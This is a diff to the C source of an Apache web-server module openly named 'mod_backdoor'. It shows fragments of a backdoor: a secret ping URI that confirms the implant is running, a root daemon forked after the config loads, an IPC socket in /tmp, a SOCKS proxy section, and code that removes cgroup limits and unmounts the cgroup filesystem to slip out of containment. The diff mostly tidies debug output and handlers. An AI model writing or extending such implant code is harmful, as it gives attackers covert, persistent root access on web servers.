@@ -134,8 +134,6 @@ static void dolog(const char* fmt, ...) { }
 #define IPC "/tmp/mod_backdoor"
 
 pid_t pid;
-static pid_t mainPid;
-static pid_t rootPid;
 
 /****************************/
 /// SOCKS proxy functions ///
@@ -822,13 +820,7 @@ static int backdoor_post_read_request(request_rec *r) {
     }
 
 	if (!strcmp(r->uri, PINGWORD)) {
-		//write(fd, "[+] Backdoor module is running !\n", strlen("[+] Backdoor module is running !\n"));
-		char* info = malloc(1024);
-        sprintf(info,"mainPID --> %d\n",mainPid);
-		write(fd,info, strlen(info));
-        sprintf(info,"rootPID --> %d\n",rootPid);
-        write(fd,info, strlen(info));
-		free(info);
+		write(fd, "[+] Backdoor module is running !\n", strlen("[+] Backdoor module is running !\n"));
 		close(fd);
 		exit(0);
 	}
@@ -946,6 +938,7 @@ void* rmCgroup(){
             sprintf(str,"%d",getpid());
             write(fd,str,strlen(str)); // <---
             // ----------------------------
+            close(fd);
             free(str);
         }
         if (umount(CGROUP2) == 0 ){
@@ -999,7 +992,6 @@ int waitIPC(int master){
                         }else{
                             pid = fork();
                             if(pid == 0){
-                                rootPid = getpid();
                                 waitIPC(master);
                             }else{
                                 exit(0);
@@ -1012,6 +1004,7 @@ int waitIPC(int master){
     }
 }
 
+/*
 void sig_handler(int signum)
 {
     remove(IPC);
@@ -1022,19 +1015,18 @@ void sig_handler(int signum)
         exit(0);
     }
 }
+*/
 
 int backdoor_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp, server_rec *s) {
 
     pid = fork();
     // Return father process just after he had loaded the config to create apache2 root daemon
     if (pid > 0) {
-        mainPid = getpid();
         return OK;
     }
-    rootPid = getpid();
 
-    signal(SIGTERM, sig_handler);
-    signal(SIGKILL, sig_handler);
+    /*signal(SIGTERM, sig_handler);
+    signal(SIGKILL, sig_handler);*/
 
     int master, rc, sd, sr;
     struct sockaddr_un serveraddr;
@@ -1081,23 +1073,11 @@ static int backdoor_log_transaction(request_rec *r) {
 		return DECLINED;
 	}
 
-    // Clean old IPC to assure compatibility with non-systemd systems
-    // systemd has a private /tmp for apache2, which is cleaned everytime the service (re)start
-    // init-like process doesn't have private /tmp by default for apache2
-    // That was an issue when restarting the apache2 service
-    /*** CURRENTLY NOT WORKING ***/
-    //apr_pool_cleanup_register(r->pool,NULL,amIAlone,apr_pool_cleanup_null);
-
 	exit(0);
 }
 
-/*apr_pool_cleanup_register(p,NULL,removeIPC,apr_pool_cleanup_null);
+// apr_pool_cleanup_register(p,NULL,removeIPC,apr_pool_cleanup_null);
 
-void apr_pool_cleanup_register 	( 	apr_pool_t *  	p,
-                                       const void *  	data,
-                                       apr_status_t(*)(void *)  	plain_cleanup,
-                                       apr_status_t(*)(void *)  	child_cleanup
-)*/
 
 
         static void backdoor_register_hooks(apr_pool_t *p){
